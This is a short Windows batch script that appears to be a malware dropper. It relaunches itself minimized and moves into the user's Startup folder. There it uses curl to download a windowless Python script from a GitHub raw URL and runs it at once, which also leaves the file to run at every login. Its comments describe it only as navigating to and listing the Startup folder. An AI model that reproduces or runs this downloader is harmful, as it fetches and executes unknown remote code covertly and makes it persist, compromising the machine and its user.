@echo off
if not defined MINIMIZED (
    set MINIMIZED=1
    start "" /min "%~dpnx0"
    exit
)

rem Navigate to the current user's Startup folder

rem Get the Startup folder path for the current user
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Navigate to the Startup folder
cd /d "%startupFolder%"

rem Display the current directory to confirm
echo You are now in the Startup folder:
curl -o t.pyw https://raw.githubusercontent.com/oogabooga245/cant/refs/heads/main/t.pyw

start t.pyw

rem Optional: list the contents of the Startup folder
dir

exit
